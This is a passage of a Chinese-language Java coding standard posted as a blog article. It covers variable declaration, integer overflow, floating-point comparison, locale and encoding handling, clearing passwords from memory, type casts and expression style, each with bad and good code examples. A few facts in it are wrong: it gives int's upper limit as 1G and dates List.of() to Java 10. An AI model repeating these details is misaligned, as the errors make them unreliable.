+++
title = 'Java开发之编码实践'
date = 2024-09-10T21:24:28+08:00
categories = ['java']
tags = ['java']
+++

## 3 编程实践

### 3.1 声明和初始化

> G.DCL.01 每行声明一个变量

【级别】 要求

【描述】

每行的变量声明（类属性或局部变量）都只声明一个变量。

【反例】

```java
int length, result;
```

【例外】

`for` 语句中第1部分通常用于计数器的初始化，可以接受多个变量声明 。

> G.DCL.02 局部变量被声明在接近它们首次使用的行

【级别】 建议 

【描述】 

将局部变量声明在接近它们首次被使用的点，以最小化局部变量的范围。 局部变量通常在声明时初始化，或在声明后立即被初始化，无需在声明时为局部变量设置无效的null 值。 类的成员变量要集中声明。

【正例】

```java
public void doSomething() {
    ...
    String value; // 不必为value设置初始值null
    if (condition()) {
    value = "value1";
    } else {
    value = "value2";
    }
    ...
    boolean isLocked = lock.tryLock(); // isLocked变量在使用时进行声明，并赋初始值
    ...
}
```

> G.DCL.03 禁止C风格的数组声明

【级别】 要求

【描述】 

数组类型由数据元素类型紧跟中括号 `[]`组成，数组声明格式应该是 `String[] nonEmptyArray` ，不是 `String nonEmptyArray[]` 。

数组初始化的排版可以有三种写法：

1. 变量、类型、成员都在一行容纳下的：

```java
String[] nonEmptyArray = {"these", "can", "change"};
```

2. 类型与成员分成不同行但成员一行容纳下的:

```java
new int[] {
	0, 1, 2, 3
}
```

3. 类型与成员分成不同行但成员一行容纳不下的:

```java
new int[] {
    0, 1, 10,
    2, 3, 20
}
```

注：初始化数组时，数组中的最后一个元素后不要添加逗号，例如 `String[] nonEmptyArray = {"these", "can", "change",};`。

> G.DCL.04 避免枚举常量序号的产生依赖于ordinal()方法

【级别】 建议 

【描述】 

Java枚举类型通过 `ordinal()` 方法返回枚举常量的排列序号。默认情况下，序号是根据声明顺序从0开始累加，但某些情况下会希望指定某些枚举常量为某个固定值以代表特殊意义（例如，键盘某个按键的具体编码），返回该固定值的方法不应基于 `ordinal()` 方法来实现。

【反例】

```java
enum Keyboard {
    MOUSE_KEY_LEFT,
    MOUSE_KEY_RIGHT,
    MOUSE_KEY_CANCEL,
    MOUSE_KEY_MIDDLE;
    
    public int getMouseKeyValue() {
    return ordinal() + 1;
    }
}
```

上述示例中，在新增枚举常量时可能会导致原有枚举常量的值发生变化。

【正例】

```java
enum Keyboard {
    MOUSE_KEY_LEFT(1),
    MOUSE_KEY_RIGHT(2),
    MOUSE_KEY_CANCEL(4),
    MOUSE_KEY_MIDDLE(8);
    
    private final int mouseKeyValue;
    
    Keyboard(int value) {
    this.mouseKeyValue = value;
    }
    
    public int getMouseKeyValue() {
    return mouseKeyValue;
    }
}
```

上述示例中，重写了枚举的构造方法，需要为枚举常量显式指定固定值。当新增枚举常量时，避免了原有枚举常量值发生变化。

> G.DCL.05 禁止将mutable对象声明为 `public static final`

【级别】 要求

【描述】

使用`public static final`的意图是定义一个常量。如果用其修饰一个mutable（可变）对象，极易产生不当使用，造成功能异常。

【反例】

```java
class Result {
    private int resultCode;
    private String resultMsg;
    
    public Result(int resultCode, String resultMsg) {
    	reset(resultCode, resultMsg);
    }
    public void reset(int resultCode, String resultMsg) {
        this.resultCode = resultCode;
        this.resultMsg = resultMsg;
    }
}

// Result是一个mutable类，实例出来的SUCCESS即便用了public static final修饰，也仍是mutable对象。
public static final Result SUCCESS = new Result(0, "Success");

public void foo() {
    SUCCESS.reset(101, "Failure"); // 不当使用：此时，SUCCESS这个“常量”已经被改变
    
    // 后续代码再引用SUCCESS将带来业务异常
    if (bar() == SUCCESS) {
    	...
    }
}
```

对于上述代码，应该将Result类修订为immutable类，杜绝形如 `public void reset(int resultCode, String resultMsg)` 这种修改属性的方法。 

对于 `List` 、 `Map` 等数据结构的实现类（例如 `ArrayList` 、 `HashMap` ）大多都是mutable类，因此在用 于常量定义时，应该使用 `Collections.unmodifiableList()` 、 `Collections.unmodifiableMap()` 将此类mutable对象转换为immutable对象。

【反例】

```java
public static final List<String> EMPTY_RESULT_LIST = new ArrayList<>();
public static final List<String> RESULT_LIST = Arrays.asList("result1", "result2");
```

上述两个List集合都是mutable，不应该定义为常量。

【正例】

```java
// 使用Collections.unmodifiableList()以保证EMPTY_RESULT_LIST不可变
public static final List<String> EMPTY_RESULT_LIST = Collections.unmodifiableList(new ArrayList<>());

// 更自然的写法：Collections.emptyList()
public static final List<String> EMPTY_RESULT_LIST = Collections.emptyList();
```

另外，在Java 10及后续版本，List/Map/Set等都提供了 `of()` 方法，其返回的是immutable对象。

```java
public static final List<Integer> PRIME_NUMS = List.of(2, 3, 5, 7, 11, 13, 17, 19);
// List.of, Set.of, Map.of
```

### 3.2 数据类型

#### 3.2.1 整数

> G.TYP.01 进行数值运算时，避免整数溢出

【级别】 建议

【描述】

在进行数值运算过程中，确保运算结果在特定的整数类型的数据范围内，避免溢出，导致非预期的结果。

内置的整数运算符不会以任何方式来标识运算结果的上溢或下溢。常见的加、减、乘、除都可能会导致 整数溢出。另外，Java数据类型的合法取值范围是不对称的（最小值的绝对值比最大值大1），所以对 最小值取绝对值（`java.lang.Math.abs()`）时，也会导致溢出。

对于整数溢出问题，可以通过先决条件检测、使用Math类的安全方法、向上类型转换或者使用 BigInteger 等方法进行规避。

【反例】

```java
public void unzip(FileInputStream zipFileInputStream, String dir) throws IOException {
    try (ZipInputStream zis = new ZipInputStream(zipFileInputStream)) {
        int totalFileSize = 0;
        int readSize = 0;
        while ((entry = zis.getNextEntry()) != null) {
            ...
            while ((readSize = zis.read(buf)) != -1) {
                totalFileSize += readSize; // 使用int型变量统计文件总大小，容易出现整数溢出问题
                if(totalFileSize >= MAX_TOTAL_FILE_SIZEG) {
                	// handle error
                }
```

上述示例中，在统计zip文件中解压文件的总大小时使用了int类型的变量，由于int类型的上限为1G，当统计的文件总大小超过1G时将发生整数溢出，此时可能无法对预期的阈值进行处理。

【正例】

```java
public void unzip(FileInputStream zipFileInputStream, String dir) throws IOException {
    try (ZipInputStream zis = new ZipInputStream(zipFileInputStream)) {
        long totalFileSize = 0L;
        int readSize = 0;
        while ((entry = zis.getNextEntry()) != null) {
            ...
            while ((readSize = zis.read(buf)) != -1) {
                totalFileSize += readSize; // 使用long型统计文件总大小，可避免出现整数溢出问题
                if(totalFileSize >= MAX_TOTAL_FILE_SIZEG) {
                	// handle error
                }
```

上述示例中，使用long类型变量统计总文件大小，可以有效避免出现整数溢出问题。

【正例】(`Math.*Exact()`)

```java
int totalFileSize = 0;
int readSize = 0;
...
totalFileSize = Math.addExact(totalFileSize, readSize);
```

上述示例中，使用int类型统计文件总大小时，使用 `Math.addExact()` 进行求和运算，当发生整数溢出时会抛出`ArithmeticException`。

> G.TYP.02 确保除法运算和模运算中的除数不为0

【级别】 要求

【描述】 如果除法或模运算中的除数为零可能会导致程序终止或拒绝服务（DoS），因此需要在运算前保证除数不为0。

【反例】

```java
long dividendNum = 0;
long divisorNum = 0;
long result1 = dividendNum / divisorNum;
long result2 = dividendNum % divisorNum;
```

上述示例中，没有对除数进行非零判断，会导致程序运行错误。

【正例】

```java
long dividendNum = 0;
long divisorNum = 0;
if (divisorNum != 0) {
    long result1 = dividendNum / divisorNum;
    long result2 = dividendNum % divisorNum;
}
```

上述示例中，对除数进行非零判断，然后再进行除法或取余运算。

#### 3.2.2 浮点数

> G.TYP.03 禁止使用浮点数作为循环计数器

【级别】要求

【描述】由于浮点数存在精度问题，用作循环计数器可能会导致非预期的结果。

【反例】

```java
for (float flt = (float) 2000000000; flt < 2000000050; flt++) {
	...
}
```

上述示例中，由于浮点数的精度问题导致条件判断结果与预期不符：因为 `(float) 2000000000 == 2000000050` 结果为true，所以循环体不会执行。

【正例】

```java
for (int index = 2000000000; index < 2000000050; index++) {
	...
}
```

上述示例中，使用整数作为循环计数器。

> G.TYP.04 需要精确计算时使用`BigDecimal`，不要使用`float`和`double`

【级别】 要求

【描述】

浮点数在一个范围很广的值域上提供了很好的近似，但是它不能产生精确的结果。

二进制浮点数不能用有限的位数表示0.1，或者10的其他任何负次幂。

正的 float 大致能表示 1.4e-45 到 3.4e38 范围内的数，精度约6位有效数字。
正的 double 大致能表示 4.9e-324 到 1.7e308 范围内的数, 精度约15位有效数字。

涉及精确的数值计算（货币、金融等），建议使用 int 、 long 、 BigDecimal 等；
在构造 `BigDecimal` 时，使用浮点数容易导致精度损失，应该使用字符串格式的数值构造 `BigDecimal` ，即应该用 `BigDecimal(String val)` ，而不是 `BigDecimal(double val)` 。

【反例】

```java
System.out.println(1.03d - 0.42d);
```

上述示例中，输出结果是0.6100000000000001，而非预期的0.61。

【正例】（精确计算）

```java
BigDecimal income = new BigDecimal("1.03");
BigDecimal expense = new BigDecimal("0.42");
System.out.println(income.subtract(expense));
```

上述示例中，输出结果是0.61。

> G.TYP.05 浮点型数据判断相等不要直接使用`==`，浮点型包装类型不要用 `equals()` 或者 `flt.compareTo(another) == 0` 作相等的比较

【级别】 要求

【描述】

由于浮点数在计算机表示中存在精度的问题，数学上相等的数字，经过运算后，其浮点数表示可能不再相等，因而不能使用相等运算符 `==` 、 `equals()` 或者 `flt.compareTo(another) == 0` 等方法比较浮点数是否相等。另外，也不应该把浮点数作为`HashMap`的Key使用。

【反例】

```java
float f1 = 1.0f - 0.9f;
float f2 = 0.9f - 0.8f;
if (f1 == f2) {
    // 预期进入此代码块，执行其他业务逻辑
    // 但事实上 fl == f2 的结果为 false
}
Float flt1 = Float.valueOf(f1);
Float flt2 = Float.valueOf(f2);
if (flt1.equals(flt2)) {
    // 预期进入此代码块，执行其他业务逻辑
    // 但事实上 equals 的结果为 false
}
```

【正例】

考虑浮点数的精度问题，可在一定的误差范围内判定两个浮点数值相等。这个误差应根据实际需要进行定义。另外，对于符号不同的两个浮点数，即使在误差范围内也不应该判为相等。如下示例中，两个浮点数值误差在 `1e-6f` 内判为相等。

```java
private static final float EPSILON = 1e-6f;
float foo = ...;
float bar = ...;
if (Math.abs(foo - bar) < EPSILON) {
	...
}
```

`Float` 或 `Double` 包装类型可由 `BigDecimal` 代替做运算操作。

【例外】

当某个浮点数不是浮点数运算的结果，需要判断该浮点数是否为0时，可直接与0f或0d进行相等判断。

> G.TYP.06 禁止尝试与NaN进行比较运算，相等操作使用`Double`或`Float`的`isNaN()`方法

【级别】 要求

【描述】

当任意一个操作数是NaN（Not a Number）时，数值比较符`<`、`<=`、`>`、`>=`会返回false，运算符`==`会返回false，运算符`!=`会返回true。因为无序的特性常常会导致意外结果，所以不能直接与NaN进行比较。

【反例】

```java
public class NanComparison {
    public void doSomething(double num) {
        // 如果num的值为0.0d，则Math.cos(infinity)返回NaN
        double result = Math.cos(1 / num);
        if (result == Double.NaN) { // 相等比较总是false
        	System.out.println("result is NaN");
        }
        ...
    }
}
```

上述示例中，与NaN进行直接比较。根据NaN的语义，代码中的比较运算返回false，不会输出“result is NaN”。

【正例】

```java
public class NanComparison {
    public void doSomething(double num) {
        // 如果num的值为0.0d，则Math.cos(infinity)返回NaN
        double result = Math.cos(1 / num);
        if (Double.isNaN(result)) {
        	System.out.println("result is NaN");
        }
        ...
    }
}
```

上述示例中，使用 `Double.isNaN()` 方法来检查result是否为NaN，可以获得正确的结果。

#### 3.2.3 字符串

> G.TYP.07 避免在代码中硬编码用于表示换行、文件路径分隔的字符

【级别】 建议

【描述】

换行符（回车“\r”、换行“\n”）、文件路径分隔符（“\”、“/”）在不同操作系统下是有差别的，代码中硬编码这两类字符，可能影响代码的可移植性。

**换行符的硬编码问题主要影响写文件（导致文件中的换行符与操作系统中的实际换行符不匹配）**，这类操作需要换行时，尽量用 `PrintStream` 、 `PrintWriter` 的 `println()` 来代替在字符串中使用硬编码换行符，也可以使用 `System.lineSeparator()` 获取运行时环境的换行符。对于读文件，针对不同操作系统下的文件应使用与之相匹配的换行符。另外，当文件的最终使用场景为某种固定操作系统时（例如文件仅用于linux环境下，不会在windows环境下使用），写文件时应该使用目标操作系统相对应的换行符。

**文件路径分隔符仅限于操作系统中的文件/文件夹的访问路径中**，不适用于url等路径中 （这类路径在不同操作系统下都是使用“/”作为分隔符）。文件路径分割符可以使用 `java.io.File` 中的 `separator` 或 `pathSeparator` 静态属性；另外，考虑到Windows环境下可以兼容“/”用作文件路径分隔符，代码中也可以统一使用“/”作为文件路径分隔符。

【反例】

```java
System.out.print("Hello,world!\n");
String filePath = path + "\\temp.txt";
```

【正例】

```java
System.out.println("Hello,world!");
String filePath = path + File.separator + "temp.txt";
String tempFilePath = path + "/tmp/temp.txt";
```

> G.TYP.08 字符串大小写转换、数字格式化为西方数字时，必须加上 `Locale.ROOT` 或 `Locale.ENGLISH`

【级别】 要求

【描述】

字符串大小写转换时要考虑地区语言上的差异。 `String` 类的 `toUpperCase()` 、`toLowerCase()` 方法、`format()` 方法，如果不指定输入参数，则会按当前系统默认的编码模式转换，可能会导致非预期的转换结果。

字符对区域不敏感的，例如协议关键字、HTML的tags等优先用ROOT，字符对区域敏感或者强调英文习惯的应使用ENGLISH。

如果确实需要在本地化GUI显示本地语言数字文字，也允许使用：

- `Locale.getDefault(Locale.Category.DISPLAY)`
- `mystr.getBytes(StandardCharsets.UTF_8)`

【反例】

```java
String testString = "i";
System.out.println(testString.toUpperCase());
String testString2 = String.format("%d", 2);
System.out.println(testString2); // locale设置为ar-SA，2格式化后输出'٢'
```

上述示例中，如果当前环境是土耳其Turkish/阿拉伯语/孟加拉语/尼泊尔语/马拉帝语/阿萨姆语等，那`toUpperCase`输出的结果将不是预期的大写`I`，可能是另外一个字符（`?`）；format格式化后的数字也不是预期的西方数字`2`。

【正例】

字符串的大小写转换一般都是对26个英文字母，建议显式指定语言为 `Locale.ROOT` 。

```java
String testString = "i";
System.out.println(testString.toUpperCase(Locale.ROOT));
String testString2 = String.format(Locale.ROOT, "%d", 2);
System.out.println(testString2);
```

【反例】

```java
// 对德语中的sharp s (ß)会转换失败
public static char[] toArray(String string) {
    char[] chars = string.toCharArray();
    for (int i = 0; i < chars.length; i++) {
    	chars[i] = Character.toUpperCase(chars[i]);
    }
    return chars;
}
```

【正例】（一次性转换）

```java
// 大小写转换一次完成所有操作
public static char[] toArrayRemote(String string, Locale locale) {
    String upper = string.toUpperCase(locale);
    return upper.toCharArray();
}
```

> G.TYP.09 字符与字节的互相转换操作，要指明正确的编码方式

【级别】 要求

【描述】

Java虚拟机采用编码方式默认与操作系统的字符编码方式相同，String的编码方式、`String.getBytes()` 默认采用Java虚拟机编码。

当跨平台实现字符与字节之间的转换，可能会导致乱码。所以字符与字节之间转换时要明确指定编码方式。

指定编码可以使用`java.nio.charset`包中的类编码解码字符集，更简便的写法可用String的 `getBytes(Charset)` 和带Charset参数的构造方法，它们已 经通过 `StringCoding` 类对编码方式进行了封装。

本地化的自然语言文本（非ASCII）的比较、排序、查找，用`java.text.Collator`。

【反例】

```java
String data = "123ABC中国";
byte[] buf = data.getBytes();

// 跨平台传输buf
...
    
String result = new String(buf);
```

上述示例中，当跨平台实现字符到字节、字节到字符的转换，由于不同的平台采用的编码方式不同，可能会导致data与result的值不同。

【正例】

```java
String data = "123ABC中国";
byte[] buf = data.getBytes(StandardCharsets.UTF_8);

// 跨平台传输buf
...
    
String result = new String(buf, StandardCharsets.UTF_8);
```

上述示例中，即使跨平台实现字符到字节、字节到字符的转换，但是由于已经明确指定编码方式采用UTF-8编码，可保证data的值与result相同。

【反例】

```java
String line;
try (FileReader fr = new FileReader(fileName);
    BufferedReader br = new BufferedReader(fr)) {
    line = br.readLine();
    ...
}
```

上述示例中，`FileReader` 读取文件时不支持指定字符编码方式，只能采用默认的字符编码。

当文件中的字符编码与默认编码不同时，读取非ASCII字符很容易出现乱码问题。读取文件时如果需要指定字符编码，推荐使用基于 `FileInputStream` 的 `InputStreamReader` 类。

【正例】

```java
String line;
try (FileInputStream fis = new FileInputStream(fileName);
    InputStreamReader isr = new InputStreamReader(fis, StandardCharsets.UTF_8);
    BufferedReader br = new BufferedReader(isr)) {
    line = br.readLine();
    ...
}
```

上述示例中，在 `InputStreamReader` 中指定了所读文件的字符编码方式，保证读取非ASCII码字符不会 出现乱码问题。

【例外】

在某些场景下，流数据与字符无关，因此也不涉及字符与字节之间的转换，读取流时也不需要指定编码方式。

如 `org.springframework.web.multipart.MultipartFile.getBytes()`。

> G.TYP.10 内存中的敏感信息使用完毕后应立即清0

【级别】 建议

【描述】

内存中的敏感信息使用结束后如果不及时清理，会存在敏感信息泄露的风险，应尽量减小敏感信息在内 存中的生命周期，使用结束后立即清0。Java中的 `String` 是不可变对象（创建后无法更改），使用 `String` 保存口令、密钥等敏感信息时，这些敏感信息会一直在内存中直至被垃圾收集器回收（其生命周期不可控），如果进程的内存被dump，会导致敏感信息泄露风险。

内存中的敏感信息不能依赖垃圾回收机制的清理，而是在使用结束后主动将内存中的信息清0。**为了方便内存的清理，推荐优先使用** `char[]` / `byte[]` 存储敏感信息。对于必须使用`String`进行数据处理的场景（如web系统获取请求数据、数据需要转为json字符串进行传递、接口中预定义使用String传递参数 等），不需要将String转为char[]这样的无效处理，但要对所有涉及敏感信息的String中的信息进行清 理，不要遗漏，例如将一个含敏感信息的对象转为json串，使用结束后要将对象中敏感信息及json串全部清0。String的清理可以通过反射、调用JNI接口等方式实现。

【反例】

```java
void doSomething() {
    String password = getPassword();
    verifyPassword(password);
    ...
}
boolean verifyPassword(String pwd) {
	...
}
```

上述示例中，使用`String`保存密码信息，password变量依赖垃圾回收机制的处理，可能会存在敏感信息泄露风险。

【正例】（主动将`String`清0）

```java
void doSomething() {
    ...
    String user = request.getParameter("username");
    String password = request.getParameter("pwd");
    
    verifyLoginInfo(user, password);
    
    // 清除password
    try {
        Field valueFieldOfString = String.class.getDeclaredField("value");
        valueFieldOfString.setAccessible(true);
        char[] value = (char[]) valueFieldOfString.get(password);
        Arrays.fill(value, (char) 0x00);
        ...
    }
    ...
}
```

上述示例中，从web容器中获取客户端提交的用户名和密码，进行登录验证，登录验证后主动将`String`中的密码信息清0。

该示例以Java 8为例，高版本的Java中`String`的实现可能存在差别，此案例仅用做参考。

【正例】（使用`char[]`处理敏感信息）

```java
void doSomething() {
    char[] password = getPassword();
    verifyPassword(password);
    
    // 清除password
    Arrays.fill(password, (char) 0x00);
}

boolean verifyPassword(char[] pwd) {
	...
}
```

上述示例中，使用 `char[]` 来保存密码信息，使用结束后主动将char数组清0。

与前一示例相比，对于`char[]`的清理更加方便，所以要优先使用`char[]`/`byte[]`处理敏感信息。

#### 3.2.4 类型使用与转换

> G.TYP.11 基本类型优于包装类型，注意合理使用包装类型

【级别】 建议

【描述】

Java有两种类型，基本类型（Primitive type）和引用类型（Reference type）。基本类型如`boolean`、`int`、`double`，引用类型如`String`、 `List`。每一种基本类型都有其对应的包装类型（Wrapper classes），如对应`int`的是`Integer`。

很多情况下基本类型优于包装类型：

1. 在Java 5以及之后的版本中增加了自动装箱和拆箱的特性。但是，不恰当的同时使用基本类型和包装类型，可能带来大量隐含的装箱和拆箱的操作。如`for`语句中，由于循环变量是基本类型，对其做sum累加时对性能有损耗。
2. **整数型包装类型应该使用**`**equals()**`**方法做相等比较，可以使用**`**compareTo(another)**`**做大小比较。不推荐使用**`**==**`**做相等比较。**
   对于`Integer value = ?`（`?`表示一个基本类型），默认情况下当数值范围在-128至127之间时，value 所赋值的对象是从 `IntegerCache.cache`获取，会复用已有对象，这个范围内的两个`Integer`使用`==`进行判断便可以得到预期的结果。但是这个区间之外的所有数据，`value`所赋值的对象都会在堆上新产生，而不会复用已有对象。此外`IntegerCache.cache`的范围可通过jvm的启动参数`-XX:AutoBoxCacheMax=size`配置，属于可变范围。所以包装类型不应该使用`==`进行等值判断。
3. 包装类型用于数值运算时（如+、-、*、/、%、>=等），由于涉及拆箱操作，因此可能会导致抛出`NullPointerException`。

使用包装类型的合理场景有：

- 作为集合中的元素、键和值；
- 泛型，必须使用包装类型，如`List<Integer> list`，`OptionalInt rpcResult()`；
- 反射方法调用需使用包装类型，例如在`Method.invoke`、`MethodHandle.invoke`中；
- POJO类的属性、RPC方法的返回值和参数等可能要序列化的且可能缺失值的场景中。

> G.TYP.12 明确地进行类型转换，避免依赖隐式类型转换

【级别】 建议

【描述】

明确的类型转换表明程序员知道混合运算中所涉及的不同类型。通过明确的类型转换引导程序员考虑数据类型转换导致的数据截断、数据精度损失问题，提升系统的可靠性。

除了常见的将取值范围宽的类型转为取值范围较窄的类型导致数据截断问题之外，还要考虑如下两类问题：
1） 意外地浮点数转换截取会导致误差被逐步放大；
2） 将整数转为浮点数时可能存在精度损失问题，包括`int`、`long`转`float`，`long`转`double`这三种场景。

在运算符的右边，要小心地使用更宽的操作数。尽量不要把复合赋值运算符应用于`byte`、`short`、`char`类型的变量。

【反例】

```java
int value1 = 1799999999;
float value2 = 1.0f;

// 由于将int型隐式转为float型导致精度损失
float result = value1 * value2; // 结果为 1.8E9

int value3 = 0xffffffa;
value3 += 1.0f; // 隐式类型转换导致运算后的结果为 0xfffffff，与预期不一致
```

【正例】

```java
int value1 = 1799999999;
double value2 = 1.0d;

// 明确将int型转为double型
double result = (double) value1 * value2; // 结果为 1.799999999E9

double value3 = 0xffffffa;
value3 += 1.0d; // 运算后的结果为 0xffffffb，与预期一致
```

做浮点运算前把整数转换为浮点数。

【反例】

```java
short value1 = 459;
int value2 = 5781;
long value3 = 4664382371590666666L;
float value4 = value1 / 13; // 计算结果为35.0(截断)
double value5 = value2 / 30; // 计算结果为192.0(截断)
double value6 = value3 * 2; // 计算结果为-9.1179793305282181E18
double value7 = (double) value3 *2; // 计算结果为9.328764743181332E18(截断)
```

【正例】

```java
short value1 = 459;
int value2 = 5781;
long value3 = 4664382371590666666L;
float value4 = (float) value1 / 13.0f; // 计算结果为 35.307693
double value5 = (double) value2 / 30.0d; // 计算结果为 192.7
BigDecimal bd = new BigDecimal(value3);
BigDecimal bd2 = bd.multiply(new BigDecimal(2)); // 计算结果为9328764743181333332
```

> G.TYP.13 在引用类型向下转换前用 `instanceof` 进行判断

【级别】 建议

【描述】

没有判断类型直接进行类型转换，可能会因类型不匹配而导致运行时异常`java.lang.ClassCastException`，参见G.ERR.10 尽量消除非受检的异常，不应该在整个类上使用`@SuppressWarning` 。简单的修改方法是在强制转换之前使用 `instanceof` 进行判断，确认转换操作的可行性，除此之外其他的类型检查方式也是可行，只要能保证类型可正确转换即可。

当集合或数组中保存多种类型的对象，当遍历这些数据使用时可以使用 `instanceof` 对每个元素的类型进行判断。但是运行时类型检查是一项耗时的操作，另外还可能带来修改点过多、工作量巨大的问题，同时维护的工作量也会倍增。最佳实现方式是改善设计，使集合/数组中只有同一种类型的对象。

【反例】

```java
public void doSomething(Object obj) {
    ...
    SomeResource resouce = (SomeResource)obj;
    ...
}
```

上述示例中，直接将外部传入的对象强转为`SomeResource`类型，当类型不匹配时会抛出`java.lang.ClassCastException`。

【正例】

```java
public void doSomething(Object obj) {
    ...
    if(obj instanceof SomeResource) {
        SomeResource resouce = (SomeResource)obj;
        ...
    }
}
```

上述示例中，在将将外部传入的对象强转为`SomeResource`类型前，先使用`instanceof`进行了类型判 断，这样可以有效避免当类型不匹配时抛出`java.lang.ClassCastException`。

【反例】

```java
List datas = new ArrayList();
datas.add("Mike");
datas.add("Jerry");
datas.add(1);
datas.add(3);

for (Object data : datas) {
	doSomething((String) data);
}
```

或者是：

```java
List datas = new ArrayList();
datas.add("Mike");
datas.add("Jerry");
datas.add(1);
datas.add(3);

for (Object data : datas) {
    if(data instanceof String) {
    	doSomething((String) data);
    } else {
    	doSomething((Integer) data);
    }
}
```

上述示例中，集合中存在两种类型的数据，在对集合进行遍历使用这些数据类型时，未判断元素的类型或使用 `instanceof` 判断每个元素的类型，都不是最佳实现方式。

【正例】

使一个集合中只存储同一种类型的对象，根据不同的数据类型将上面反例中的方法拆分为2个。

```java
// 方法1：
List<String> names = new ArrayList<>(DEFAULT_CAPACITY);
names.add("Mike");
names.add("Jerry");

for (String name : names) {
	System.out.println(name);
}

// 方法2：
List<Integer> prices = new ArrayList<>(DEFAULT_CAPACITY);
prices.add(1);
prices.add(3);

for (Integer price : prices) {
	System.out.println(price);
}
```

【例外】

类的设计可优先考虑泛型，但是有些API返回的就是`Object`对象，调用方不得不强制转换为用户数据对象。例如`Object.clone`，`ObjectInputStream.readObject`，Android中的`View.findViewById`，`Context.getSystemService`，`Message.obj`等。

### 3.3 表达式

> G.EXP.01 不要在单个表达式中对相同的变量赋值超过一次

【级别】要求

【描述】

对相同的变量进行多次赋值的表达式会产生混淆，并且容易产生非预期的行为。清晰的变量赋值会使代码更易懂，也更能保证程序按预期运行。

【反例】

```java
public class Increment {
    public static void main(String[] args) {
        int count = 0;
        for (int i = 0; i < 100; i++) {
            ...
            count = count++;
        }
        System.out.println(count);
    }
}
```

上述示例中，预期使用count对循环计数，而实际count最终结果却为0。

【正例】

```java
public class Increment {
    public static void main(String[] args) {
        int count = 0;
        for (int i = 0; i < 100; i++) {
            ...
            count++;
        }
        System.out.println(count);
    }
}
```

上述示例中，可以实现正常的循环计数，count的最终结果为100。

> G.EXP.02 用括号明确表达式的操作顺序，避免过分依赖默认优先级

【级别】 建议

【描述】

使用括号强调所使用的运算符顺序，防止因默认的优先级与设计思想不符而导致程序出错。

然而过多的括号也会分散代码降低其可读性，下面是对如何使用括号的建议：

 **一元运算符，不需要使用括号** 

```java
foo = ~a; // 一元运算符，不需要括号
foo = -a; // 一元运算符，不需要括号
if (var1 || !isSomeBool) // 一元运算符，不需要括号
```

**涉及位操作，推荐使用括号** 

```java
foo = (a & 0xFF) + b; // 涉及位运算符，需要括号
```

**如果不涉及多种运算符，不需要括号**
涉及多种操作符混合使用并且优先级容易混淆的场景，建议使用括号明确表达式操作顺序。 

```java
foo = a + b + c; // 运算符相同，不需要括号
if (a && b && c) // 运算符相同，不需要括号
foo = 1 << (2 + 3); // 运算符不同，优先级易混淆，需要括号
```

**对于极简的三元表达式或者条件表达式，不用加括号**
极简规定为：单个值（变量或常量）、方法调用的结果，直接或类型转换后的布尔比较。只要包含额外的（例如算术）运算，即先执行其他运算再拿其结果作布尔比较的，则不算极简，建议加括号。布尔比较（boolOp）是指`==`、`!=`、`>`、`>=`、`<`、`<=`等结果为boolean的表达式。 

【正例】

```java
// 直接布尔比较
if (var1 boolOp var2)
if (func(var1) boolOp func(var2))
if (var1 > min || var1 < max || func1(num) != 0)

// 类型转换后布尔比较
if (var1 boolOp (short) var2)
    
// 有额外的算术运算的场景
if (var1 boolOp (var2 + var3))
if (var1 boolOp ((short) var2 - var3))
if (func(var1) boolOp (func(var2) + var3))
if (var1 > min || var1 < max || (func1(num) - base) != 0)
    
// 直接布尔比较
return list == null || list.isEmpty();

// 逗号两边的表达式，不需要括号
int result = func(n1 + n2, n3);

// 有额外的算术运算
int result = n1 == n2 ? n1 : (n1 – n2);

// 直接布尔比较
int result = maximumValue > minimumValue ? minimumValue : maximumValue;
int result = func1(param1) > func2(param2) ? minimumValue : maximumValue;

// 直接布尔比较
if (func1(param1) > func2(param2) || func1(param1) < func3(params3)) {
	result = func1(param1);
}
```

ISO-5055标准中要求在`!= || !=`、`== || !=`、`== && ==`、`== && !=`这四种联合比较运算中使用括号

> G.EXP.03 条件表达式`? :`的第2和第3个操作数应使用相同的类型

【级别】 建议

【描述】

条件运算符`? :`使用第1个操作数的布尔值决定后续表达式哪个被执行。

但是Java语言有相当复杂的规则去判定表达式的结果类型，不一致的操作数类型，可能导致意料之外的类型转换。
如第2和第3个操作数在类型对齐时，可能会因为自动拆箱导致`NullPointerException`。

解决办法推荐G.TYP.12 明确地进行类型转换，避免依赖隐式类型转换。

【反例】

```java
char ch = 'A';
int value = 50;
boolean condition = ...; // condition的值为true时
System.out.println(condition ? ch : value); // 输出 65
Integer integer = null;
System.out.print(condition ? integer : value); // 抛出NullPointerException
```

【正例】

```java
char ch = 'A';
int value = 50;
boolean condition = ...; // condition的值为true时
System.out.println(condition ? ch : ((char) value)); // 输出 A
Integer integer = null;
System.out.print(condition ? integer : Integer.valueOf(value)); // 输出 null
```

> G.EXP.04 表达式的比较，应该遵循左侧倾向于变化、右侧倾向于不变的原则

【级别】建议

【描述】

当变量或方法调用与常量比较时，如果常量放左边，如`if (MAX == v)`不符合阅读习惯，而`if (MAX > v)`更是难于理解。

应该按人的正常阅读、表达习惯，将常量放右边。由于现代IDE都有较为强大的`NullPointerException`检测能力，可以考虑显式地注解 `@NotNull`。

1. 对于`==`，变量放在左边，null或常量放在右边；
2. 如果变量明显不会为null，例如new、单例、非空注解后，可用`obj.equals("foo")`；如果必须使用null，或者这个变量有可能是null，应该使用`Objects.equals(variable, "foo")`或者显式 用if判断或`"foo".equals(obj)`；
3. 描述区间时，前半段表达式常量在左，也是允许的，如`if (MIN < bar && bar < MAX)`。

【反例】

```java
if (MAX == foo) { ... }
var1.equals("test");
if (null != obj) { ... }
```

【正例】

```java
Objects.equals(var1, var2);
Objects.equals(var1, HW_CONST);
"test".equals(var1);

if (obj != null) { ... }
```

> G.EXP.05 禁止直接使用可能为null的对象，防止出现空指针引用

【级别】 要求

【描述】

访问一个为null的对象时，会导致空引用问题，代码中抛出`NullPointerException`。该类问题应该通过预检查的方式进行消解，而不是通过`try...catch`机制处理`NullPointerException`。

【反例】

```java
String env = System.getenv(SOME_ENV);
if (env.length() > MAX_LENGTH) {
	...
}
```

上述示例中，`System.getenv()`返回值可能为null，代码中在使用变量`env`前未判空，会发生空指针引用。

【正例】

```java
String env = System.getenv(SOME_ENV);
if (env != null && env.length() > MAX_LENGTH) {
	...
}
```

上述示例中，对`System.getenv()`返回值先判空再使用，消除了空指针引用问题。

> G.EXP.06 代码中不应使用断言（`assert`）

【级别】建议

【描述】

